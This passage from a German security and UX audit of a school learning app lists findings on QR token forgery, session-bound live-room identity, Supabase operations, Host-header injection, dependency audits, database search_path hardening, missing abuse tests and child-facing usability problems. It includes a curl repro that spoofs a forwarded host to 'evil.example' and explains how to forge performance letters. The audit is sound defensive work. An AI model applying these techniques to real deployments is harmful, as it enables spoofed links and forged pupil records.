- **Beschreibung:** Das „HMAC-Token“ ist ein zufälliges 128-bit-Geheimnis, das im **ausgedruckten** Einschreibe-QR steht. Wer ein Foto des QR-Bogens hat, kann für jedes Kind gültige Leistungsbriefe fälschen. Das Kind selbst kann seine eigenen Ergebnisse ohnehin beliebig erzeugen; das ist eine bekannte PWA-Grenze (Vault 16). Aufgaben-QRs sind unsigniert. Mit einer Klassen-ID, die in jedem Einschreibe-QR steht, kann jeder „Aufgaben der Lehrkraft“ und Entfernungscodes für die Klasse erzeugen. Ein Kind muss den Code aber selbst scannen.
- **Belege:** `src/domain/teacher-workspace.ts:183-265` (HMAC-SHA-256 mit `enrollmentToken` als Schlüssel), `:155-168, 267-276` (Aufgaben-QR unsigniert), `src/domain/student-assignment.ts:26-56`, `src/domain/class-enrollment.ts:464-475` (`lernraum:remove:<classId>`); Codepfade.
- **Betroffene:** Lehrkräfte (Vertrauen in Leistungsbriefe), Kinder (Streiche).
- **Folgen:** Geringe Integrität der Abgabeprotokolle; Social Engineering unter Kindern.
- **Empfehlung (Vorschlag zur Prüfung):** Leistungsbriefe ausdrücklich als „nicht fälschungssicher“ kennzeichnen und nicht für Noten verwenden. Aufgaben- und Entfernungs-QRs mit dem Klassenschlüssel (ECDSA) signieren; die Prüfung ist auf dem Kindgerät vorhanden (`sealPublicKey`).
- **Aufwand:** S–M
- **Erfolgskriterium:** Ein unsignierter Aufgaben-QR wird abgewiesen (Test).
- **Quelle:** `agent-b-sicherheit.md`

### B-019 – Live-Raum-Identität nur im Sitzungsspeicher: Tab-Verlust auf dem iPad kostet Fortschritt bzw. Raumsteuerung

- **Bereich:** Zuverlässigkeit Live-Raum
- **Schwere:** P2
- **Evidenzstatus:** begründetes Risiko (Mechanik per Codeanalyse bestätigt, iPad-Verhalten nicht geprüft)
- **Gegenprüfung:** Empfehlung eingeschränkt (F, Teil 6.4): Teilnehmertoken nur mit Rückfrage „Weiter als …?“ und Ablauf zum Raumende speichern (geteilte Geräte).
- **Beschreibung:** Schließt Safari den Tab, iOS beendet die Home-Bildschirm-App im Hintergrund oder das Kind wischt sie weg, gehen Teilnehmertoken und Spur verloren. Ein neuer Beitritt erzeugt einen neuen Teilnehmer: Der alte Fortschritt hängt verwaist in der Lehrerliste, das Kind beginnt von vorn. Nach 90 min ist kein Beitritt mehr möglich. Verliert die Lehrkraft ihren Tab, kann sie den Raum weder steuern noch beenden; er läuft bis zur Serverschließung (120 min). Die Pilot-Doku nennt die Tab-Bindung, bewertet sie aber nicht als Risiko. Positiv: Die Wahl von `sessionStorage` statt `localStorage` begrenzt die Lebensdauer der Geheimnisse. Das ist ein bewusster Zielkonflikt.
- **Belege:** `src/integrations/laufdiktat/room-api.ts:200-227` (Lehrkrafttoken in `sessionStorage`), `:390-418` (Teilnehmeridentität in `sessionStorage`), `src/integrations/laufdiktat/live-trace.ts:4, 41` (Spurdaten), Migration `20261003120000_room_time_limits.sql:57-59` (kein Neubeitritt nach 90 min); Codepfad. iPad-Test: Raum beitreten, App aus dem App-Umschalter schließen, neu öffnen.
- **Betroffene:** Kinder auf älteren iPads (Speicherdruck), Lehrkräfte am iPad.
- **Folgen:** Doppelte oder verwaiste Ergebnisse, Frust, Unterrichtsunterbrechung.
- **Empfehlung (Vorschlag zur Prüfung):** Teilnehmertoken je Raumcode in IndexedDB mit Ablauf zum Raumende ablegen (`localStorage` nur, wenn kein gemeinsames Gerät). Lehrkrafttoken mit Ablauf ebenso, ggf. verschlüsselt. Die Lehrkraft einen Teilnehmer „zusammenführen“ lassen.
- **Aufwand:** S–M
- **Erfolgskriterium:** E2E: Kontext schließen, neu öffnen → derselbe Teilnehmer, derselbe Fortschritt.
- **Quelle:** `agent-b-sicherheit.md`

### B-020 – Supabase-Betrieb: Pausierung, Kontingente, Überwachung unbekannt

- **Bereich:** Verfügbarkeit / Betrieb
- **Schwere:** P2
- **Evidenzstatus:** offene Frage
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Laut mehreren (Dritt-)Quellen pausiert der Free-Tarif Projekte nach 7 Tagen Inaktivität, bis sie jemand im Dashboard reaktiviert. Nach den Herbst- oder Weihnachtsferien würde die erste Stunde scheitern. Datenbank- und Realtime-Kontingente (gleichzeitige Verbindungen) sind ebenfalls tarifabhängig. Es gibt keine dokumentierte Überwachung.
- **Belege:** Vault 12 (ein Projekt `Lernraum`, eu-west-1, Räume und Transfers gemeinsam); keine Health-Checks oder Alarme im Repository; Tarif und Projekt-Einstellungen im Supabase-Dashboard prüfen (nur Betreiber).
- **Betroffene:** alle Live-Raum-Nutzer.
- **Folgen:** Ausfall nach Ferien, bei Klassenstärke oder bei DoS (B-006).
- **Empfehlung (Vorschlag zur Prüfung):** Tarif dokumentieren. Bei Free-Tarif einen Keep-alive-Job oder Pro-Tarif. Speicher- und Verbindungsalarme. Ein Betriebs-Runbook in `laufdiktat-pilot-operations.md`.
- **Aufwand:** S
- **Erfolgskriterium:** Dokumentierter Tarif, Alarme und Ferientest.
- **Quelle:** `agent-b-sicherheit.md`

### B-021 – Host-Header fließt ungeprüft in Metadaten

- **Bereich:** Web-Sicherheit
- **Schwere:** P3
- **Evidenzstatus:** bestätigt (reproduziert, Dev-Server)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Ein Angreifer kann `og:image` und andere absolute Metadaten-URLs auf fremde Hosts lenken. Da HTML mit `no-store` ausgeliefert wird, ist eine Cache-Vergiftung unwahrscheinlich. Relevant wird es, wenn künftig ein Edge-Cache oder kanonische Links dazukommen.
- **Belege:** `app/layout.tsx:38-49` (`generateMetadata`: `x-forwarded-host`/`x-forwarded-proto` → `metadataBase`, `og:image`); `curl -H "X-Forwarded-Host: evil.example" -H "X-Forwarded-Proto: https" http://127.0.0.1:3002/impressum` → `og:image = https://evil.example/og.png`.
- **Betroffene:** keine unmittelbar.
- **Folgen:** gering.
- **Empfehlung (Vorschlag zur Prüfung):** Basis-URL aus einer Konfigurationsvariablen lesen.
- **Aufwand:** S
- **Erfolgskriterium:** Test mit gefälschtem Header liefert die konfigurierte Domain.
- **Quelle:** `agent-b-sicherheit.md`

### B-022 – Abhängigkeiten: Auditbefund harmlos, Begründung methodisch schief, Framework-Reife ein Risiko

- **Bereich:** Lieferkette
- **Schwere:** P3
- **Evidenzstatus:** bestätigt (ausgeführt)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** `npm audit` meldet 10 Befunde (7 hoch, 3 mittel): `braces`/`micromatch`/`fast-glob` über `@next/eslint-plugin-next` und `vinext → vite-plugin-commonjs`, außerdem `fflate`/`satori`/`@vercel/og`. Die Einschätzung im Register, dass keine davon zur Laufzeit erreichbar ist, halte ich für plausibel: Lint/Build bzw. keine OG-Bilder, Suche in `dist` laut Register. **Aber** das Argument „`--omit=dev` = 0 = ausgelieferte Pakete“ ist methodisch falsch: Die Laufzeit des Workers (vinext-Server, RSC-Runtime) ist als devDependency deklariert und wird trotzdem ausgeliefert. `--omit=dev` prüft also gerade den Framework-Kern nicht. Hinzu kommt die geringe Reife von vinext 1.1.0 als Nachbau von Next.js: Sicherheitskorrekturen von Next.js/React (vgl. die RSC-Lücken 2025) müssen dort eigens nachgezogen werden. Es gibt keine Server Actions (`"use server"` nicht gefunden); das verkleinert die Angriffsfläche.
- **Belege:** `package.json` (`vinext`, `react-server-dom-webpack`, `@vitejs/plugin-rsc` als devDependencies), `worker/index.ts:2-3` (bündelt `vinext/server/*`), `docs/security-risk-register.md` SR-001; `npm audit --json` → `{"moderate":3,"high":7,"critical":0,"total":10}`; `npm audit --omit=dev` → `total:0`.
- **Betroffene:** Betreiber.
- **Folgen:** Übersehene Laufzeitlücken im Framework.
- **Empfehlung (Vorschlag zur Prüfung):** Laufzeitpakete (vinext, react-server-dom-webpack) als `dependencies` führen, damit `--omit=dev` aussagekräftig wird. Sicherheitsmeldungen von vinext, React (RSC) und Next.js abonnieren. Den Ausstiegspfad (SR-001) mit Auslöse-Kriterien versehen.
- **Aufwand:** S
- **Erfolgskriterium:** `npm audit --omit=dev` umfasst die Worker-Laufzeit; das Register nennt den Prüfrhythmus mit Datum.
- **Quelle:** `agent-b-sicherheit.md`

### B-023 – `SECURITY DEFINER` mit `search_path`, der `public` zuerst durchsucht

- **Bereich:** Datenbankhärtung
- **Schwere:** P3
- **Evidenzstatus:** bestätigt (Codeanalyse)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Alle `SECURITY DEFINER`-Funktionen setzen einen `search_path`. Das ist gut, der Supabase-Linter wäre zufrieden. Die Raum-Funktionen durchsuchen aber `public` vor `pg_catalog`. Ein Objekt in `public`, das eine Katalogfunktion überschattet, liefe mit Owner-Rechten. Heute dürfen `anon`/`authenticated` nichts in `public` anlegen, daher nur ein Härtungspunkt. Positiv: `revoke … from public`, Standardrechte entzogen (`harden_default_api_privileges`), `force row level security`, Tabellen ohne Clientrechte, DB-Vertragstests.
- **Belege:** u. a. `20260825124001_migrate_laufdiktat_live_rooms.sql` (alle Raum-RPCs: `set search_path=public,private,extensions,pg_catalog`), `20261003120000_room_time_limits.sql:21`; vorbildlich dagegen die Transfer-RPCs (`set search_path = ''`); Migrationen lesen.
- **Betroffene:** Betreiber.
- **Folgen:** Rechteausweitung nur bei künftigen Fehlkonfigurationen.
- **Empfehlung (Vorschlag zur Prüfung):** Einheitlich `set search_path = ''` mit voll qualifizierten Namen, wie bei den Transfer-Funktionen. Ein DB-Test, der das für alle `SECURITY DEFINER`-Funktionen prüft.
- **Aufwand:** S
- **Erfolgskriterium:** Abfrage auf `pg_proc.proconfig` im Vertragstest grün.
- **Quelle:** `agent-b-sicherheit.md`

### B-024 – Sicherheits- und Offline-Eigenschaften sind kaum durch Tests abgesichert

- **Bereich:** Qualitätssicherung (Querschnitt)
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (Codeanalyse)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Die Testsuite ist groß (1683 Unit-Tests, 19 DB-Vertragstests). Die hier gefundenen Fehler liegen aber genau in nicht getesteten Eigenschaften: Was der Angreifer _nicht_ darf, und ob die Sicherung _alles_ enthält. Der Service Worker wird nur per Regex auf Quelltext geprüft und in der E2E-Suite blockiert.
- **Belege:** `playwright.config.ts:24`, `tests/rendered-html.test.mjs:232-256`, fehlende Tests zu Realtime-Autorisierung, Sicherungs-Round-Trip mit allen Tabellen, Sicherheitsheadern, CSV-Formeln, Downgrade, Stationsbindung; siehe Einzelbefunde.
- **Betroffene:** alle (indirekt).
- **Folgen:** Rückfälle, falsche Sicherheit durch grüne CI.
- **Empfehlung (Vorschlag zur Prüfung):** Missbrauchsfall-Tests als eigene Kategorie: DB-Vertragstests je RPC für den „fremden Teilnehmer“, ein Strukturtest für die Sicherung (alle Dexie-Tabellen und Felder), eine Offline-Suite gegen den Produktionsbuild, Header-Tests. Die Repro-Tests dieses Berichts lassen sich nahezu unverändert übernehmen.
- **Aufwand:** M
- **Erfolgskriterium:** Jeder Befund B-001 bis B-021 hat einen Regressionstest. ---
- **Quelle:** `agent-b-sicherheit.md`

## C – QA, UI/UX, Barrierefreiheit

### C-001 – Übungsrunden gehen bei einem Fehltipp, „Zurück“ oder Neuladen ohne Rückfrage verloren (außer Textbox)

- **Bereich:** Schülerablauf, Fehler- und Abbruchverhalten
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** Empfehlung eingeschränkt (F, Teil 6.5): Zwischenstand speichern und „Weitermachen“ statt Dialog bei jeder Navigation (Roadmap K4).
- **Beschreibung:** Während einer Runde bleiben die untere Leiste (Lernen, Üben, Raum, Profil), das Logo („Zur Startseite“) und der Zurück-Pfeil aktiv. Ein Tipp darauf, die Zurück-Geste des Browsers oder ein Neuladen beendet die Runde sofort. Es gibt keine Rückfrage und kein „Weitermachen“. Was erhalten bleibt, ist je Modul verschieden: Wortspeicher und LernBox speichern jede einzelne Antwort, Kopfrechnen merkt sich Fehlaufgaben. Der Rundenfortschritt, der Abschluss und die Rückmeldung am Ende sind aber weg. Laufdiktat allein und Tastenwelt verlieren den Lauf vollständig. Die Textbox zeigt dagegen nach dem Neuladen „Durchgang 2 offen … weiterüben“; dort ist das Problem gelöst.
- **Belege:** `app/views/wortspeicher/round-screen.tsx:80` (Schaltfläche „Übung beenden“ ohne Rückfrage), `app/components/learning-word-app.tsx:432-438` (`leaveRound`: verwirft den Lauf), `:352-398` (`finish`: die Runde wird erst am Ende gespeichert); `app/frei/mathematics/mental-math-app.tsx:888-897` („Runde beenden“ setzt sofort auf die Einstellungen zurück); `app/frei/german/laufdiktat/running-dictation-app.tsx:458` („Runde beenden“ → `reset`); einziger Abbruchschutz der App: … (vollständig in `agent-c-qa-ux.md`); `repro-c/s-abort.mjs` und `repro-c/s-abort3.mjs` (iPad Hochformat 810×1080, Touch). Ergebnisse dieses Laufs: Wortspeicher „ck und tz“, Stufe 1, nach 4 von 10 Wörtern „Übung beenden“ → Übersicht, 0 Dialoge, kein Angebot zum Fortsetzen. Wortspeicher Stufe 2 mitten in der Runde, Browser-Zurück → landet auf `/ueben` (die Runde hat keine eigene Adresse). Kopfrechnen nach Fehlversuchen neu geladen → Einstellungsseite, nur „Eine Aufgabe wartet auf … (vollständig in `agent-c-qa-ux.md`)
- **Betroffene:** jüngere Kinder und Kinder mit geringer Aufmerksamkeit (Fehltipps auf die große untere Leiste), Kinder mit Lernschwierigkeiten (die mühsam erarbeitete halbe Runde ist weg), Klassen, die nach Klingel oder Gerätewechsel unterbrechen.
- **Folgen:** Frust und Abbruch. Kinder erleben „alles weg“, obwohl Einzelantworten gespeichert sind. Für das Ziel kurzer, regelmäßiger Einheiten fehlt die Unterbrechbarkeit, die im Schulalltag (Klingel, Akku, Wechsel an die Lehrkraft) die Regel ist.
- **Empfehlung (Vorschlag zur Prüfung):** (1) Während einer Runde einen einheitlichen Abbruchdialog für Logo, Leiste und Zurück-Pfeil („Runde wirklich beenden? Deine Antworten bis hier sind gespeichert.“) mit „Weiterüben“ als Standard. (2) Zwischenstand je Runde wie bei der Textbox in IndexedDB halten und beim nächsten Öffnen „Weitermachen“ anbieten (Wortspeicher, Kopfrechnen, Laufdiktat allein). (3) Die Runde als eigenen Verlaufseintrag führen (`history.pushState`), damit die Zurück-Geste zuerst die Runde und nicht das Modul verlässt. (4) Die untere Leiste in Runden ausblenden oder abschwächen (Fokusmodus).
- **Aufwand:** M
- **Erfolgskriterium:** E2E-Test je Modul: Runde starten, 3 Antworten, Neuladen bzw. Zurück → Angebot „Weitermachen“ mit Stand 3/10; Tipp auf die Leiste → Rückfrage.
- **Quelle:** `agent-c-qa-ux.md`

### C-002 – Feste Merkzeit in der Textbox ohne Pause oder Verlängerung

- **Bereich:** Barrierefreiheit (WCAG 2.2.1 „Zeitbegrenzung anpassbar“), Differenzierung
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** Empfehlung eingeschränkt (F, Teil 6.6): Regel „Vorlage und Eingabe nie gleichzeitig sichtbar“ als Test erhalten (Roadmap M4).
- **Beschreibung:** In jedem der vier Durchgänge läuft eine Merkzeit. Nach Ablauf springt die Ansicht ohne Zutun in die Schreibphase. Es gibt nur „Ich bin bereit“ (vorzeitig beenden), aber weder Pause noch Verlängerung. Die vorhandene Schreiberleichterung (LRS-Freigabe) wirkt nur im Live-Laufdiktat (`app/raum/use-writing-relief.ts`), nicht hier. Ein Kind, das langsam liest oder kurz abgelenkt ist, verliert den Text, bevor es ihn gelesen hat.
- **Belege:** `src/domain/textbox-session.ts:156-158` (`memorizeSeconds`, fest 60/90/120 s je Schwierigkeit), `app/components/textbox-app.tsx:137-149` (Intervall beendet die Merkphase nach Ablauf selbsttätig), `app/views/textbox/run-layout.tsx:259-260` (`role="timer"`); Vault `24 - Textbox/Anwendung.md:21,70` (Merkzeiten ausdrücklich „zu kalibrieren“).; `repro-c/s-textbox-timer.mjs` mit `page.clock`: Start „Der kleine Hund“ → „Noch 0:59“; Schaltflächen nur „Ich bin bereit“; nach 30 s „Noch 0:28“; nach 61 s ohne Eingabe: „Schreibe die fehlenden Wörter in die Lücken …“, 8 Lücken sichtbar, kein Weg zurück zum Text (`shots/ipad-portrait-tbt-after-timeout.png`).
- **Betroffene:** Kinder mit LRS, langsame Leser, DaZ-Kinder, Kinder mit Aufmerksamkeitsschwierigkeiten.
- **Folgen:** Systematisch schlechtere Werte genau bei denen, die die Textbox am meisten brauchen. Das verstärkt die von D-005 beschriebene Verzerrung zugunsten des Textbehaltens.
- **Empfehlung (Vorschlag zur Prüfung):** Merkzeit standardmäßig ohne harte Grenze („Ich bin bereit“ als einziger Übergang) oder mit „+30 s“ und Pause. Eine Profileinstellung „mehr Zeit“ (auch von der Lehrkraft setzbar), die alle Zeitgrenzen der Schülermodule verlängert.
- **Aufwand:** S
- **Erfolgskriterium:** Bei aktivierter Einstellung endet keine Merkphase ohne Handlung des Kindes; ein Komponententest prüft das.
- **Quelle:** `agent-c-qa-ux.md`

### C-003 – Erstes Öffnen: „Heute ist nichts dran“, und „Weiterlernen“ führt ein neues Kind in die Tastenwelt

- **Bereich:** Schülerablauf (Szenario 1 „erstes Öffnen“), Orientierung
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Ein Kind ohne Klasse und ohne Lehrkraftinhalte tippt auf der Startseite „Weiter als Esel“. Es sieht ein Tier, „Heute ist nichts dran – frei üben“, zwei Kacheln „0 heute dran“ und „0 schwierige Wörter“ sowie die große Schaltfläche „Weiterlernen“. Diese führt nicht zu Rechtschreibung oder Mathematik. Sie führt in die **Tastenwelt** mit 50 Stationen und einer Tastaturgrafik. Grund: Wortspeicher, Kopfrechnen und LernBox erzeugen erst nach eigener Nutzung Empfehlungen, die Tastschreib-Lektion 1 ist dagegen immer „der nächste passende Schritt“. Auf einem Schüler-iPad ohne Hardwaretastatur ist das Zehnfingersystem das am wenigsten passende Angebot (D-014). Zudem widersprechen sich die Signale: „nichts dran“ und „Weiterlernen“ für ein Kind, das nie angefangen hat. Eine Einführung, Hinweise zu den Bereichen oder ein erster Vorschlag aus den Kernfächern fehlen.
- **Belege:** `app/lernen/learner-home.tsx:20-28` (Ziel von „Weiterlernen“: erstes offenes Portionselement, sonst erste Empfehlung), `src/storage/learning-recommendations.ts:286-320` (einziger Kandidat ohne Vorgeschichte: nächste Tastschreib-Lektion „… beginnen“), `src/storage/daily-plan.ts:88-164` (Portion nur aus Vorhandenem, siehe D-011), `app/views/lernen/home-screen.tsx:116` („Heute ist nichts dran – frei üben“).; `repro-c/s1-first.mjs` (frischer Browserkontext, iPad Hochformat): Startseite „Lehrer-Login | Weiter als Esel | Tippen öffnet deinen Lernraum | RAUMCODE …“ → `/lernen`: „Heute ist nichts dran – frei üben | Weiterlernen | 0 heute dran | 0 schwierige Wörter“ → `href` von „Weiterlernen“ = `/frei/typing` → Tastenwelt „0 von 50 Stationen geschafft … Weiter mit Lektion 1“. Screenshot `shots/ipad-portrait-light_lernen.png`.
- **Betroffene:** alle Kinder beim ersten Kontakt, besonders jüngere Kinder mit wenig Leseerfahrung (sie folgen der großen Schaltfläche); Lehrkräfte, die „Mein Lernraum“ als Einstieg empfehlen.
- **Folgen:** Der erste Eindruck verfehlt die Kernziele Rechtschreibung und Mathematik. Kinder landen in einem Modul, das auf dem iPad kaum bedienbar ist (siehe C-004 zur Bildschirmtastatur), und brechen ab oder irren durch „Üben“. Die Startseite verspricht Führung, liefert aber keine.
- **Empfehlung (Vorschlag zur Prüfung):** (1) Leerzustand für neue Kinder: kurze Begrüßung mit zwei bis drei großen Bildkarten „Wörter üben“, „Rechnen“, „Vokabeln“ statt „Weiterlernen“. (2) Tastenwelt nur empfehlen, wenn eine Hardwaretastatur erkannt wurde oder die Lehrkraft sie freigibt. (3) „Weiterlernen“ erst zeigen, wenn es etwas fortzusetzen gibt; sonst „Loslegen“. (4) Mittelfristig die curriculare Startsequenz aus D-011 einspeisen.
- **Aufwand:** S (1–3), M (4)
- **Erfolgskriterium:** E2E-Test „frisches Gerät“: Die Hauptschaltfläche führt in ein Deutsch- oder Mathe-Angebot; kein Widerspruch zwischen Statuszeile und Schaltflächentext.
- **Quelle:** `agent-c-qa-ux.md`

### C-004 – Tastenwelt auf dem iPad: Bildschirmtastatur verdeckt Vorlage oder Tastaturgrafik

- **Bereich:** Schülerablauf auf Tablets, Bildschirmtastatur
- **Schwere:** P3
- **Evidenzstatus:** begründetes Risiko (nur per verkleinerter Ansicht emuliert; Safari verschiebt bei Bildschirmtastatur den sichtbaren Ausschnitt anders als Chromium)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Die Übungsansicht besteht aus Vorlage, Fortschritt und einer großen Tastaturgrafik mit Fingerfarben. Auf einem iPad ohne Hardwaretastatur öffnet das Antippen von „Hier tippen“ die Bildschirmtastatur. Die verdeckt im Querformat rund die Hälfte des Bildschirms. In der Emulation (Ansicht 1080×430 statt 1080×810) lag die Vorlage „Tippe ab: …“ nach dem Fokussieren 259 px oberhalb des sichtbaren Bereichs; sichtbar blieb die verschwommene Grafiktastatur mit „Einfach lostippen“. Im Hochformat (810×680) blieb die Vorlage sichtbar. Fingerzuordnung und Grundstellung, der Kern des Lehrgangs, lassen sich auf Glas nicht üben (pädagogisch bei D-014).
- **Belege:** `app/views/tastenwelt/practice-screen.tsx:99-148` (verstecktes Tippfeld, `onInput` als Rückfall für Bildschirmtastaturen), `:438` („Einfach lostippen“); kein Hinweis auf eine nötige Hardwaretastatur in `app/views/tastenwelt/`.; `repro-c/s-typing-kbd.mjs`: `land-kbd {"active":"INPUT:Tippfeld","targetTop":-259,"vh":430,"sh":769}`, `port-kbd {"targetTop":146,"vh":680}`; Screenshot `shots/typing-land-kbd.png`. Zum Vergleich: Wortspeicher und Textbox halten Eingabefeld und „Prüfen“ in beiden emulierten Höhen sichtbar (`repro-c/s-kbd.mjs`).
- **Betroffene:** alle Kinder an iPads ohne Tastaturhülle.
- **Folgen:** Kinder üben „Zehnfingerschreiben“ mit zwei Fingern auf Glas; Fortschrittsanzeige und Sterne belohnen etwas anderes als das Lernziel.
- **Empfehlung (Vorschlag zur Prüfung):** Hardwaretastatur erkennen (erstes `keydown` mit `code`) und ohne sie einen klaren Hinweis zeigen („Für die Tastenwelt brauchst du eine Tastatur“); auf echtem iPad mit Safari prüfen. In Verbindung mit C-003 die Tastenwelt nicht als ersten Vorschlag anbieten.
- **Aufwand:** S
- **Erfolgskriterium:** Auf einem iPad ohne Tastatur erscheint der Hinweis statt einer nicht nutzbaren Übung; Prüfung auf Gerät dokumentiert.
- **Quelle:** `agent-c-qa-ux.md`

### C-005 – Fokus geht beim Schließen von Blättern verloren; „Menü“ ohne Menü-Tastaturbedienung

- **Bereich:** Barrierefreiheit (WCAG 2.4.3 Fokusreihenfolge, 4.1.2 Name/Rolle/Wert), Tastatur und Schalter-/VoiceOver-Bedienung
- **Schwere:** P3
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** (1) Wer im Wortspeicher eine Wortbox per Tastatur öffnet und das Blatt mit Escape oder „Schließen“ verlässt, landet auf `BODY`, also am Seitenanfang, nicht auf der Box. Ursache: Das native `<dialog>` wird samt Inhalt aus dem DOM entfernt, statt geschlossen zu werden. Dasselbe Muster (`cond ? <Sheet …/> : null`) kommt bei weiteren der 11 `Sheet`-Verwendungen in Frage (nicht einzeln geprüft). (2) Das LernBox-Menü meldet sich als Menü (`aria-haspopup="menu"`, `role="menu"`), lässt den Fokus nach dem Öffnen aber auf dem Auslöser; Pfeiltasten tun nichts, nur Tab erreicht die Einträge. Bildschirmleser kündigen eine Menübedienung an, die es nicht gibt.
- **Belege:** `app/components/learning-word-app.tsx:820-851` (`StartSheet` wird beim Schließen ausgehängt statt über `open={false}` geschlossen), `app/ui/sheet.tsx:24-35` (Schließen nur über den Effekt bei `open=false`; beim Aushängen läuft kein `close()`, damit keine Fokus-Rückgabe); LernBox-Schaltfläche „Vokabeln hinzufügen“ mit `aria-haspopup="menu"` und Einträgen `role="menuitem"` (`app/views/lernbox/parts/home.tsx:201-206`).; `repro-c/s-focus2.mjs` (Desktop-Chromium): Box fokussieren → Enter → Fokus „Schließen“ → Escape → Fokus `BODY`; ebenso nach „Schließen“. LernBox: `aria-haspopup: menu`, nach Enter `aria-expanded: true`, Fokus bleibt „Vokabeln hinzufügen“, ArrowDown → keine Bewegung, Tab → „Selbst eintragen“. Positiv in `repro-c/s-keyboard.mjs`: In Runden steht der Fokus sofort im Eingabefeld, nach einer falschen Antwort auf „Noch einmal versuchen“, danach … (vollständig in `agent-c-qa-ux.md`)
- **Betroffene:** Kinder mit motorischen Einschränkungen (Schaltersteuerung, Tastatur), VoiceOver-Nutzer, Lehrkräfte mit Tastatur am Beamer-Rechner.
- **Folgen:** Orientierungsverlust nach jedem geschlossenen Blatt; überflüssige Wege. Kein Blocker, aber ein wiederkehrender Reibungspunkt.
- **Empfehlung (Vorschlag zur Prüfung):** `Sheet` immer eingehängt lassen und über `open` steuern oder beim Aushängen den Fokus auf den Auslöser zurückgeben (gemeinsamer Haken in `app/ui/sheet.tsx`). Für das LernBox-Menü entweder das APG-Menümuster vollständig umsetzen (Fokus auf ersten Eintrag, Pfeiltasten, Escape) oder `role="menu"` entfernen und eine einfache Liste von Schaltflächen anbieten. Einen E2E-Test „Fokus kehrt zurück“ für alle Blätter ergänzen.
- **Aufwand:** S
- **Erfolgskriterium:** Nach Escape/Schließen steht der Fokus auf dem auslösenden Element (automatisierter Test für Wortspeicher, LernBox, Textbox, Lehrerdialoge).
- **Quelle:** `agent-c-qa-ux.md`

### C-006 – QR-Bogen druckt nur die erste Bildschirmseite: bei 24 Kindern fehlen 12 Codes

- **Bereich:** Lehrerablauf (Klasse einrichten, Einschreibung), Druck
- **Schwere:** P2 (Prüfinstanz: P1)
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** abgeschwächt (F, reproduziert: 12 von 24 Namen, mit einer Druckregel 24/24): sichtbarer Fehler ohne Daten- oder Lernschaden; Sofortmaßnahme vor dem ersten Klasseneinsatz.
- **Beschreibung:** Der Lehrerrahmen ist ein bildschirmhoher Kasten mit eigenem Scrollbereich. Beim Drucken bleibt diese Höhe erhalten; alles unterhalb des ersten Bildschirms wird abgeschnitten. Der QR-Bogen einer Klasse mit 24 Kindern ergibt **eine** A4-Seite mit 12 Codes (Ali bis Lea), die fünfte Reihe ist angeschnitten, Mats bis Zoe fehlen. Zusätzlich druckt die mobile Kopfzeile des Lehrerbereichs („3a · Klassen“, Menü- und Hell/Dunkel-Knopf) mit. Die Seite meldet keinen Fehler; die Lehrkraft bemerkt es erst beim Austeilen.
- **Belege:** `app/views/lehrer/teacher-frame.module.css:7-34` (`.frame { height: 100%; overflow: hidden }`, `.column { overflow-y: auto }`; keine `@media print`-Regel in der Datei), `app/components/teacher-class-configurator.tsx:356-394` (QR-Bogen, `window.print()` in Z. 375); vorhandene Druckregeln greifen nur für Schülerseiten (`app/ui/lernraum-ui.css:3014-3024`, `body:has([data-print-sheet])`).; `repro-c/s-teacher-print.mjs` und `repro-c/s-print2.mjs`: Klasse „3a“, 24 Schüler, „QR-Bogen für die Klasse“ → `page.pdf({format:"A4"})`. Ergebnis Desktop 1280×800 und iPad 810×1080: je `Pages: 1`, 12 von 24 Namen im PDF-Text (`pdftotext`). Bild der Seite: `shots/qrbogen-p-1.png`. Die E2E-Suite prüft den QR-Bogen nur auf dem Bildschirm (`e2e/platform-quality.spec.ts:936-939`), Druck nur für die Textbox (`e2e/textbox.spec.ts:365-375`).
- **Betroffene:** Lehrkräfte beim Einrichten einer Klasse; die Hälfte der Kinder kann sich nicht per Bogen einschreiben.
- **Folgen:** Der wichtigste Weg in die Klasse scheitert in der ersten Stunde für die halbe Klasse. Die Lehrkraft muss Einzel-QRs am Bildschirm zeigen. Vertrauensverlust beim ersten Einsatz.
- **Empfehlung (Vorschlag zur Prüfung):** Druckregel für den Lehrerrahmen: `@media print { .frame, .layout, .column { height: auto; overflow: visible } .bar, .sidebar { display: none } }`, QR-Karten mit `break-inside: avoid`. E2E-Test: Bogen mit 24 Schülern als PDF, Seitenzahl ≥ 2, alle Namen im Text. Zusätzlich Hinweis „vertraulich“ auf dem Bogen (siehe B-008).
- **Aufwand:** S
- **Erfolgskriterium:** PDF eines Bogens mit 30 Schülern enthält alle 30 Namen ohne angeschnittene Codes und ohne Bedienelemente; automatisierter Test grün.
- **Quelle:** `agent-c-qa-ux.md`

### C-007 – Sprache für Erwachsene: Fachwörter, lange Hinweistexte, keine vorgelesenen Anleitungen

- **Bereich:** Verständlichkeit für Kinder (Szenario 2 „Aufgabe nicht verstanden“), DaZ, LRS, jüngere Kinder
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (Codeanalyse und Browser), Lesbarkeitswerte gemessen
- **Gegenprüfung:** Teilaussage (F, Teil 2.7): LIX ist für Oberflächenfragmente keine Messgröße; der Befund trägt sich über Begriffszählungen.
